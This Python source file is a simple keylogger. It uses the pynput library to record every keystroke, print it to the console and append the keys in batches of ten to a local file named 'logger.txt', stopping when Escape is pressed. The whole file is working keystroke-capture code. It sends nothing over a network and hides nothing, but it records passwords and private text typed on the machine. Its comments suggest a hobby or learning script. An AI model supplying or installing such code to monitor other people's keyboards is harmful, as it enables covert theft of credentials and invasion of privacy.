import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

# function for when a key is pressed
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10: # will write to the txt file every 10th key typed
        count = 0
        write_file(keys)
        keys = []

# writes the pressed keys to a txt file 'logger.txt'
def write_file(keys):
    with open("logger.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0: # checks if a space bar was hit
                # todo add logic to check if the character before it was a space and continue if it was
                f.write("\n")
            elif k.find("Key") == -1: # does not find any of the special character keys    
                f.write(k)
            else: # finds one of the special character keys
                k = k.replace("Key.", "")
                f.write(k)



# function for when a key is released
def on_release(key):
    # breaks out of the loop
    if key == Key.esc: # if the key equals the 'escape' key
        return False

with Listener(on_press=on_press, on_release=on_release) as listener: # functions when a key is pressed/released
    listener.join() # keeps the loop running until we break out of it